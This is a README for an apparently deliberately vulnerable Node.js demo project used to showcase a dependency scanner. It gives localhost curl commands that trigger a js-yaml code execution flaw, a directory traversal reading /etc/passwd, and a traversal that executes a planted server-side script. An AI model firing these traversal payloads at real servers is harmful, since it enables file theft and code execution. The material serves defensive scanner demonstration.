# [:] Example node project with vulnerable methods

A node project to demonstrate srcclr agent's vulnerable methods feature for JavaScript

## Vulnerability 1 (SID-13642) Exploit

```
git clone https://github.com/srcclr/example-javascript-vulnerable-methods.git
cd example-javascript-vulnerable-methods
npm install
node index.js

```
The vulnerable method is called twice during the server startup, however another one needs to be trigged by issuing a
request to the endpoint by running the following command in another terminal to trigger the code execution vulnerability 
in `js-yaml:load`

```
curl --path-as-is 'http://127.0.0.1:8001/api/'
```

## Vulnerability 2 (SID-20301) Exploit

Use the following to trigger the directory traversal vulnerability (SID-20301)in `algo-httpserv:serve` 

```
curl --path-as-is 'http://127.0.0.1/8001/../../../../../../etc/passwd'
```


## Vulnerability 3 (SID-21402) Exploit

```
git clone https://github.com/srcclr/example-javascript-vulnerable-methods.git
cd example-javascript-vulnerable-methods
npm install
node larvitbase-api.js

```

and then run the following command in another terminal

```
curl --path-as-is 'http://127.0.0.1:8001/../../../../hacked'
```
You can see the JavaScript file`hacked.js` is executed in the server side.

## Scan with SRCCLR Agent

```
brew tap srcclr/srcclr
brew install srcclr
srcclr activate
srcclr scan --url https://github.com/srcclr/example-javascript-vulnerable-methods
```
